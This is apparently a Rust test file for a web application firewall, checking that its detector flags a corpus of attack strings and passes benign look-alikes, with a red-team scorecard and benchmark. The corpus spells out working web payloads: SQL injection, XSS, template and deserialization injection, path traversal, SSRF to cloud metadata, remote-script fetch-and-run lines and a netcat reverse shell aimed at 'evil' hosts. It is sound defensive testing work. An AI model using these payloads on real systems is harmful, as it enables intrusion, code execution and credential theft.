//! End-to-end corpus tests over the public `SemanticEngine` with the default
//! (all-modules-on) config. Two contracts:
//!   * **Attacks** are detected at Medium+ (would be challenged/blocked).
//!   * **Benign** values are never detected at Medium+ (the false-positive
//!     contract — Low/log-only is tolerated).

use http::HeaderMap;

use fluxgate_core::{WafRisk, WafSemanticConfig};
use fluxgate_waf::SemanticEngine;

fn engine() -> SemanticEngine {
    let e = SemanticEngine::new();
    e.rebuild(&WafSemanticConfig::default());
    e
}

/// Highest risk found over a `?q=<value>` query request.
fn query_risk(e: &SemanticEngine, value: &str) -> Option<WafRisk> {
    let encoded = urlencode(value);
    let target = format!("/app?q={encoded}");
    let headers = HeaderMap::new();
    e.analyze_request(&target, &headers)
        .into_iter()
        .map(|d| d.risk)
        .max()
}

/// Highest risk over a JSON body `{"f":"<value>"}`.
fn json_risk(e: &SemanticEngine, value: &str) -> Option<WafRisk> {
    let body = format!("{{\"f\":{}}}", json_string(value));
    e.analyze_body(Some("application/json"), &body)
        .into_iter()
        .map(|d| d.risk)
        .max()
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

fn json_string(s: &str) -> String {
    let mut out = String::from("\"");
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            _ => out.push(c),
        }
    }
    out.push('"');
    out
}

const ATTACKS: &[&str] = &[
    // SQLi
    "1' OR '1'='1",
    "' OR 1=1 --",
    "admin'--",
    "1; DROP TABLE users",
    "1 UNION SELECT username,password FROM users",
    "1' AND sleep(5)-- -",
    "0 UNION SELECT table_name FROM information_schema.tables",
    "'; EXEC xp_cmdshell('whoami')--",
    "1 OR 1=1",
    "1 OR 1>0",           // unquoted tautology (no quote/`=`/keyword — gated in via `>`)
    "1 OR 5>3 -- -",      // unquoted comparison tautology with comment
    "1) or (1=1",         // parenthesized tautology (libinjection fingerprint)
    "admin') or ('x'='x", // parenthesized string-context tautology (libinjection)
    // XSS
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(document.cookie)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<x onclick=alert(1)>", // unknown tag + handler (libinjection)
    "<div style=\"x:expression(alert(1))\">", // style-based XSS (libinjection)
    "<svg><animate onbegin=alert(1)>", // nested handler tag (libinjection)
    // SSTI
    "{{7*7}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{ 9*9 }",
    // NoSQL
    "{\"username\":{\"$ne\":null}}",
    "user[$gt]=&pass[$gt]=",
    "{\"$where\":\"this.a==this.b\"}",
    "$invalid {\"u\":{\"$ne\":null}}", // shadow prefix must not hide the real operator
    // XXE
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]>",
    // Deserialization
    "rO0ABXNyABFqYXZhLnV0aWwu",
    "O:8:\"stdClass\":1:{s:3:\"cmd\";}",
    "c__builtin__\neval\n(S'1'\ntR.", // Python pickle gadget (gate must open for it)
    "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}", // Node node-serialize
    // PHP function injection (was crs-933-php; now the `php` semantic module)
    "system('id')",
    "shell_exec('whoami')",
    "<?php system($_GET['c']); ?>",
    "passthru('cat /etc/passwd')",
    "call_user_func('system','id')",
    "preg_replace('/.*/e', $_GET['c'], '')",
    // Java / OGNL / SpEL injection (was crs-944-java; now the `java` semantic module)
    "%{(#a=@java.lang.Runtime@getRuntime()).exec('id')}",
    "Class.forName('java.lang.Runtime').getMethod('exec')",
    "org.apache.struts2.dispatcher.class.classLoader.resources",
    "@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS",
    // Traversal / LFI
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd", // double-decoded by the engine
    "/var/www/../../etc/shadow",
    "php://filter/convert.base64-encode/resource=index.php",
    // Command injection
    "1; cat /etc/passwd",
    "$(curl http://evil/x|sh)",
    "`id`",
    "; /bin/sh -i",
    "foo\ncurl http://evil/x|sh", // newline-separated chaining (gated in via CTRL)
    // SSRF
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:6379/",
    "http://0177.0.0.1/", // octal-obfuscated loopback (inet_aton)
    "http://2130706433/", // 32-bit decimal loopback
    "/latest/meta-data/iam/security-credentials/", // bare relative metadata path
];

const BENIGN: &[&str] = &[
    // SQL-ish prose / search queries
    "union select tutorial for beginners",
    "how to use UNION SELECT in mysql",
    "order by date ascending please",
    "I want to learn SQL and databases",
    "select your favourite colour",
    "1 + 1 = 2 equals two",
    // Names with apostrophes / ampersands
    "O'Brien",
    "D'Angelo & Sons; cat lovers club",
    "Procter & Gamble",
    "Tom & Jerry",
    // Code-ish discussion that is not an attack
    "the onload event fires when the page is ready",
    "I love javascript: it is a fun language",
    "use <b>bold</b> and <code>x = y</code> in markdown",
    "a < b and c > d are comparisons",
    "Smith &ltd reports strong Q4 numbers", // `&ltd` must NOT over-decode to `<d`
    "compare a > b and x < y in algebra",
    // Template interpolation / `$`-prose / serialized-looking ratios (new modules)
    "${user.name}",
    "{{ t('welcome.message') }}", // i18n helper call — benign template, not SSTI
    "${formatCurrency(total)}",   // bare helper call — benign template, not SSTI
    "Hello {{ name }}, welcome back",
    "the price is $net 5 per item",
    // PHP/Java *mentions* (not calls/markers) — must stay clean (the FP win)
    "how to use shell_exec in php safely",
    "a preg_replace tutorial for beginners",
    "the system administrator approved the request",
    "the java classloader explained in depth",
    "base64 encoding is not encryption",
    "a:1 ratio of pixels on screen",
    "<span>{{ user }}</span>",
    // Files / paths
    "report-2024.bak",
    "my-document.final.v2.pdf",
    "images/photo.jpg",
    // Command words in prose
    "cats and dogs are great pets",
    "my id card number is 12345",
    "please review the report; thanks",
    "rock & roll music",
    // URLs to own/external sites (non-redirect param)
    "https://example.com/page",
    // Misc realistic values
    "user@example.com",
    "Hello, world! This is a normal comment.",
    "price is $5 and up",
];

/// Adversarial red-team battery: real-world payloads + known WAF-evasion variants
/// across every module, plus look-alike benign traffic. Prints a recall/precision
/// scorecard and lists every MISS and FALSE POSITIVE so gaps are visible (not
/// asserted away). Run:
///   cargo test -p fluxgate-waf --release --test corpus -- --ignored --nocapture red_team
#[test]
#[ignore]
fn red_team() {
    let e = engine();

    // (category, payload) — should all be detected at Medium+ via query or body.
    let attacks: &[(&str, &str)] = &[
        // ---- SQLi: classic + comment/case/inline/encoding evasions ----
        ("sqli", "' OR '1'='1"),
        ("sqli", "1' OR 1=1-- -"),
        ("sqli", "admin'--"),
        ("sqli", "'; DROP TABLE users--"),
        ("sqli", "1 UNION SELECT username,password FROM users"),
        ("sqli", "1 UNION ALL SELECT NULL,NULL,NULL--"),
        ("sqli", "1'/**/OR/**/'1'='1"),
        ("sqli", "1' uNiOn sElEcT 1,2,3-- -"),
        ("sqli", "1' AND SLEEP(5)-- -"),
        ("sqli", "1';WAITFOR DELAY '0:0:5'--"),
        ("sqli", "1' AND 1=1-- -"),
        (
            "sqli",
            "0 UNION SELECT table_name FROM information_schema.tables",
        ),
        ("sqli", "1) OR (1=1"),
        ("sqli", "admin') OR ('x'='x"),
        ("sqli", "1'||'1'='1"),
        ("sqli", "'; EXEC xp_cmdshell('whoami')--"),
        ("sqli", "1 AND extractvalue(1,concat(0x7e,version()))"),
        ("sqli", "1' ORDER BY 5-- -"),
        // ---- XSS: tag/attr/uri/case/svg/polyglot ----
        ("xss", "<script>alert(1)</script>"),
        ("xss", "<ScRiPt>alert(document.cookie)</ScRiPt>"),
        ("xss", "<img src=x onerror=alert(1)>"),
        ("xss", "<IMG SRC=x ONERROR=alert(1)>"),
        ("xss", "<svg/onload=alert(1)>"),
        ("xss", "<svg><animate onbegin=alert(1)>"),
        ("xss", "\"><script>alert(1)</script>"),
        ("xss", "' onmouseover='alert(1)"),
        ("xss", "<iframe src=javascript:alert(1)>"),
        ("xss", "javascript:alert(document.cookie)"),
        ("xss", "jAvAsCrIpT:alert(1)"),
        ("xss", "<a href=\"javascript:alert(1)\">x</a>"),
        ("xss", "<body onload=alert(1)>"),
        ("xss", "<div style=\"x:expression(alert(1))\">"),
        ("xss", "<details open ontoggle=alert(1)>"),
        // ---- Command injection ----
        ("cmdi", "; cat /etc/passwd"),
        ("cmdi", "| nc 10.0.0.1 4444 -e /bin/sh"),
        ("cmdi", "`id`"),
        ("cmdi", "$(whoami)"),
        ("cmdi", "&& curl http://evil/x|bash"),
        ("cmdi", "; /bin/sh -i"),
        ("cmdi", "foo\ncat /etc/shadow"),
        ("cmdi", "x; powershell -enc ZQBjAGgA"),
        // ---- Path traversal (raw + single/double percent + backslash) ----
        ("traversal", "../../../../etc/passwd"),
        ("traversal", "..%2f..%2f..%2fetc%2fpasswd"),
        ("traversal", "..\\..\\..\\windows\\win.ini"),
        ("traversal", "/var/www/../../etc/shadow"),
        (
            "traversal",
            "php://filter/convert.base64-encode/resource=index.php",
        ),
        ("traversal", "....//....//etc/passwd"),
        // ---- SSRF ----
        ("ssrf", "http://169.254.169.254/latest/meta-data/"),
        ("ssrf", "http://127.0.0.1:6379/"),
        ("ssrf", "http://0177.0.0.1/"),
        ("ssrf", "http://2130706433/"),
        ("ssrf", "http://localhost:8080/admin"),
        ("ssrf", "http://[::1]/"),
        // ---- SSTI ----
        ("ssti", "{{7*7}}"),
        ("ssti", "${7*7}"),
        ("ssti", "#{7*7}"),
        ("ssti", "<%= 7*7 %>"),
        ("ssti", "{{config.__class__.__init__.__globals__}}"),
        ("ssti", "${T(java.lang.Runtime).getRuntime().exec('id')}"),
        // ---- NoSQL ----
        ("nosql", "{\"username\":{\"$ne\":null}}"),
        ("nosql", "{\"$where\":\"this.a==this.b\"}"),
        ("nosql", "user[$gt]=&pass[$gt]="),
        ("nosql", "{\"q\":{\"$regex\":\".*\"}}"),
        // ---- XXE ----
        (
            "xxe",
            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]>",
        ),
        ("xxe", "<!ENTITY xxe SYSTEM \"http://evil/x\">"),
        // ---- Deserialization ----
        ("deser", "rO0ABXNyABFqYXZhLnV0aWwu"),
        ("deser", "O:8:\"stdClass\":1:{s:3:\"cmd\";}"),
        ("deser", "c__builtin__\neval\n(S'1'\ntR."),
        (
            "deser",
            "{\"x\":\"_$$ND_FUNC$$_function(){require('cp').exec('id')}()\"}",
        ),
        // ---- PHP function injection ----
        ("php", "system('id')"),
        ("php", "shell_exec('whoami')"),
        ("php", "<?php system($_GET['c']); ?>"),
        ("php", "passthru('ls -la')"),
        ("php", "call_user_func('system','id')"),
        ("php", "preg_replace('/.*/e', $_GET['c'], '')"),
        // ---- Java / OGNL / SpEL ----
        ("java", "%{(#a=@java.lang.Runtime@getRuntime()).exec('id')}"),
        (
            "java",
            "Class.forName('java.lang.Runtime').getMethod('exec')",
        ),
        (
            "java",
            "org.apache.struts2.dispatcher.class.classLoader.resources",
        ),
        ("java", "@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS"),
        // ---- Protocol ----
        ("proto", "/x%00.jpg"),
        ("proto", "value%0d%0aSet-Cookie:%20admin=1"),
    ];

    // Look-alike benign traffic that must NOT be flagged (the precision side).
    let benign: &[&str] = &[
        "union select tutorial for beginners",
        "how to prevent sql injection in php",
        "I want to learn about XSS and CSRF",
        "the onload event fires when ready",
        "use <b>bold</b> and <code>x = y</code> here",
        "a < b and c > d in mathematics",
        "O'Brien & Sons, attorneys at law",
        "D'Angelo's pizza; best in town",
        "order by relevance, then by date",
        "drop me a line at user@example.com",
        "select your preferred language",
        "${user.displayName}",
        "{{ user.name }} signed in",
        "{{ t('home.welcome') }}",
        "${formatPrice(total)}",
        "how to use shell_exec in php safely",
        "a preg_replace tutorial",
        "the system administrator will review it",
        "the java classloader explained",
        "base64 is an encoding, not encryption",
        "the price is $net 5 per unit",
        "a:1 aspect ratio image",
        "report-2024-final.v2.pdf",
        "images/photos/holiday.jpg",
        "https://example.com/products?page=2&sort=name",
        "please review the PR; thanks!",
        "my id is 12345 and my name is Bob",
        "rock & roll all night",
        "C:\\Users\\Public\\Documents\\readme.txt",
        "search: best laptops under $1000",
        "<p>A normal paragraph of content.</p>",
        "the meeting is at 3:30 on the 2nd",
        "100% complete — {done}",
        "git clone https://github.com/org/repo.git",
        "SELECT a course from the catalog",
    ];

    // Harder evasions real bypasses use — reported (not asserted): some of these
    // are *expected* to slip (e.g. overlong UTF-8, glob/$IFS shell tricks), which
    // is the honest picture of where the engine's limits are.
    let hard_evasions: &[(&str, &str)] = &[
        ("sqli", "1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3"), // MySQL versioned comment
        ("sqli", "1';SELECT/**/PG_SLEEP(5)--"),
        ("sqli", "{\"q\":\"1\\u0027 OR 1=1-- -\"}"), // JSON unicode-escaped quote
        ("sqli", "1\u{2019} OR \u{2019}1\u{2019}=\u{2019}1"), // unicode smart-quotes
        ("xss", "<a href=&#106;avascript:alert(1)>"), // entity-encoded scheme
        ("xss", "<svg onload=alert&#40;1&#41;>"),    // entity-encoded parens
        ("xss", "<img src=x onerror=\\u0061lert(1)>"),
        ("traversal", "..%c0%af..%c0%afetc/passwd"), // overlong UTF-8
        ("traversal", "%252e%252e%252fetc%252fpasswd"), // double-encoded
        ("cmdi", "cat$IFS$9/etc/passwd"),            // $IFS separator
        ("cmdi", "/???/??t${IFS}/???/p??s?d"),       // glob + IFS
        ("ssrf", "http://0x7f.0.0.1/"),              // hex octet loopback
        ("ssrf", "http://①②⑦.0.0.1/"),               // unicode-digit IP
        ("ssrf", "http://127.0.0.1.nip.io/"),        // DNS-name-to-loopback
    ];

    let best = |p: &str| -> Option<WafRisk> {
        [query_risk(&e, p), json_risk(&e, p)]
            .into_iter()
            .flatten()
            .max()
    };
    let detected = |p: &str| best(p).map(|r| r >= WafRisk::Medium).unwrap_or(false);

    let mut missed: Vec<(&str, &str)> = Vec::new();
    for (cat, p) in attacks {
        if !detected(p) {
            missed.push((cat, p));
        }
    }
    let mut fps: Vec<(&str, WafRisk)> = Vec::new();
    for p in benign {
        if let Some(r) = best(p) {
            if r >= WafRisk::Medium {
                fps.push((p, r));
            }
        }
    }

    let caught = attacks.len() - missed.len();
    let recall = caught as f64 / attacks.len() as f64 * 100.0;
    let clean = benign.len() - fps.len();
    let precision = clean as f64 / benign.len() as f64 * 100.0;

    println!("\n================ RED-TEAM SCORECARD ================");
    println!(
        "  recall   : {caught}/{} attacks caught ({recall:.1}%)",
        attacks.len()
    );
    println!(
        "  precision: {clean}/{} benign clean   ({precision:.1}% — {} false positives)",
        benign.len(),
        fps.len()
    );
    if !missed.is_empty() {
        println!("  --- MISSED attacks (evasion gaps) ---");
        for (cat, p) in &missed {
            println!("    [{cat:>9}] {p}");
        }
    }
    if !fps.is_empty() {
        println!("  --- FALSE POSITIVES ---");
        for (p, r) in &fps {
            println!("    [{r:?}] {p}");
        }
    }
    // Hard-evasion characterization (report-only — finding the real limits).
    let mut hard_caught = 0;
    let mut hard_missed: Vec<(&str, &str)> = Vec::new();
    for (cat, p) in hard_evasions {
        if detected(p) {
            hard_caught += 1;
        } else {
            hard_missed.push((cat, p));
        }
    }
    println!(
        "  hard evasions: {hard_caught}/{} caught ({:.0}%)",
        hard_evasions.len(),
        hard_caught as f64 / hard_evasions.len() as f64 * 100.0
    );
    for (cat, p) in &hard_missed {
        println!("    [slip:{cat:>9}] {p}");
    }
    println!("====================================================\n");

    // Hard floors: no false positives, and ≥90% recall on this adversarial set.
    assert!(
        fps.is_empty(),
        "{} false positive(s) — see scorecard",
        fps.len()
    );
    assert!(
        recall >= 90.0,
        "recall {recall:.1}% < 90% — see missed list"
    );
}

#[test]
fn attacks_are_detected() {
    let e = engine();
    for a in ATTACKS {
        let q = query_risk(&e, a);
        let j = json_risk(&e, a);
        let best = [q, j].into_iter().flatten().max();
        assert!(
            best.map(|r| r >= WafRisk::Medium).unwrap_or(false),
            "attack not detected at Medium+: {a:?} (query={q:?}, json={j:?})"
        );
    }
}

/// Microbenchmark: per-request semantic cost on benign traffic (the common
/// case). Run with:
///   cargo test -p fluxgate-waf --release --test corpus -- --ignored --nocapture bench_semantic
#[test]
#[ignore]
fn bench_semantic() {
    use std::time::Instant;
    let e = engine();
    let mut headers = HeaderMap::new();
    headers.insert(
        http::header::USER_AGENT,
        "Mozilla/5.0 (X11; Linux x86_64)".parse().unwrap(),
    );
    headers.insert(
        http::header::COOKIE,
        "sid=abc123; theme=dark; lang=en".parse().unwrap(),
    );

    let benign = "/api/v1/users?page=2&sort=name&filter=active&q=hello+world";
    let iters = 200_000u32;
    for _ in 0..20_000 {
        std::hint::black_box(e.analyze_request(std::hint::black_box(benign), &headers));
    }
    let t = Instant::now();
    for _ in 0..iters {
        std::hint::black_box(e.analyze_request(std::hint::black_box(benign), &headers));
    }
    let ns = t.elapsed().as_nanos() as f64 / iters as f64;

    let attack = "/x?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--";
    let t2 = Instant::now();
    for _ in 0..iters {
        std::hint::black_box(e.analyze_request(std::hint::black_box(attack), &headers));
    }
    let ns2 = t2.elapsed().as_nanos() as f64 / iters as f64;

    // A value that opens SQLi + XSS + CMDI gates at once — the case the shared
    // single-lowercase win targets (previously lowercased once per detector).
    let multi = "/x?q=1%27%20OR%20%271%27%3D%271%3B%20cat%20/etc/passwd%20%3Cscript%3E";
    let t3 = Instant::now();
    for _ in 0..iters {
        std::hint::black_box(e.analyze_request(std::hint::black_box(multi), &headers));
    }
    let ns3 = t3.elapsed().as_nanos() as f64 / iters as f64;

    // A benign JSON API body — every string value is unescaped, so extraction
    // borrows each value (the P3-cont win) instead of allocating a String per field.
    let json_body = r#"{"name":"alice","email":"alice@example.com","city":"springfield","note":"hello there","tags":"a","status":"active"}"#;
    let t4 = Instant::now();
    for _ in 0..iters {
        std::hint::black_box(e.analyze_body(
            std::hint::black_box(Some("application/json")),
            std::hint::black_box(json_body),
        ));
    }
    let ns4 = t4.elapsed().as_nanos() as f64 / iters as f64;

    println!(
        "\nsemantic analyze_request (single core):\n  benign  (5 params + UA + 3 cookies): {ns:>7.0} ns/req\n  attack  (SQLi in query):             {ns2:>7.0} ns/req\n  multi   (SQLi+XSS+CMDI gates):        {ns3:>7.0} ns/req\n  json    (6-field benign API body):    {ns4:>7.0} ns/req\n"
    );
}

#[test]
fn benign_values_never_blocked() {
    let e = engine();
    for b in BENIGN {
        for (ctx, risk) in [("query", query_risk(&e, b)), ("json", json_risk(&e, b))] {
            assert!(
                risk.map(|r| r < WafRisk::Medium).unwrap_or(true),
                "benign value falsely flagged Medium+ in {ctx}: {b:?} (risk={risk:?})"
            );
        }
    }
}
